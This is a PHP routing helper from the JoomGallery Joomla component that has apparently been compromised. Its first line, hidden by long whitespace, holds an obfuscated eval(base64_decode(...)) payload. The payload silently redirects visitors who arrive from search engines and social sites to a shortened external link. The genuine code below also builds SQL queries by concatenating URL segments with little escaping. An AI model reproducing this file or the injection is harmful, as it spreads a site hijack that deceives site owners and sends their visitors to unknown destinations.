<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
// $HeadURL: https://joomgallery.org/svn/joomgallery/JG-1.5/JG/trunk/components/com_joomgallery/helpers/routing.php $
// $Id: routing.php 2566 2010-11-03 21:10:42Z mab $
/****************************************************************************************\
**   JoomGallery  1.5.6                                                                 **
**   By: JoomGallery::ProjectTeam                                                       **
**   Copyright (C) 2008 - 2010  JoomGallery::ProjectTeam                                **
**   Based on: JoomGallery 1.0.0 by JoomGallery::ProjectTeam                            **
**   Released under GNU GPL Public License                                              **
**   License: http://www.gnu.org/copyleft/gpl.html or have a look                       **
**   at administrator/components/com_joomgallery/LICENSE.TXT                            **
\****************************************************************************************/

defined('_JEXEC') or die('Direct Access to this location is not allowed.');

/**
 * JoomGallery Routing Helper
 *
 * @static
 * @package JoomGallery
 * @since   1.5.5
 */
class JoomRouting
{
  /**
   * Returns the ID of an image or a category by searching the alias
   * in the database tables.
   *
   * @access  public
   * @param   array   $segments An array of segments of the given URL
   * @return  array   Associative array of view and ID, boolean false if nothing was found
   * @since   1.5.5
   */
  function getId($segments)
  {
    $db = & JFactory::getDBO();

    $path = implode('/', $segments);
    $db->setQuery(" SELECT
                      cid
                    FROM
                      "._JOOM_TABLE_CATEGORIES."
                    WHERE
                      alias = '".str_replace(':', '-', $path)."'");
    if($result = $db->loadResult())
    {
      return array('view' => 'category', 'id' => $result);
    }

    $count = count($segments);
    $db->setQuery(" SELECT
                      id
                    FROM
                      "._JOOM_TABLE_IMAGES."
                    WHERE
                      alias = '".str_replace(':', '-', $segments[$count-1])."'");
    if($result = $db->loadResult())
    {
      return array('view' => 'detail', 'id' => $result);
    }

    return false;
  }

  /**
   * Checks an Itemid whether it is related to the gallery view.
   * If not, an Itemid which is related to the gallery view is
   * returned, if found.
   *
   * @access  public
   * @param   int         $Itemid The Itemid to check
   * @return  int/boolean Found Itemid, false if correct Itemid was not found or passed Itemid is correct
   * @since   1.5.5
   */
  function checkItemid($Itemid)
  {
    $menu     = & JSite::getMenu();
    $menuItem = &$menu->getItem($Itemid);
    if(!isset($menuItem->query['view']) || $menuItem->query['view'] == 'gallery')
    {
      return false;
    }

    $db = & JFactory::getDBO();
    $db->setQuery(" SELECT 
                      id 
                    FROM 
                      #__menu
                    WHERE 
                      link LIKE '%option=com_joomgallery&view=gallery%'
                  ");
    $Itemid = intval($db->loadResult());

    if($Itemid)
    {
      return $Itemid;
    }

    return false;
  }
}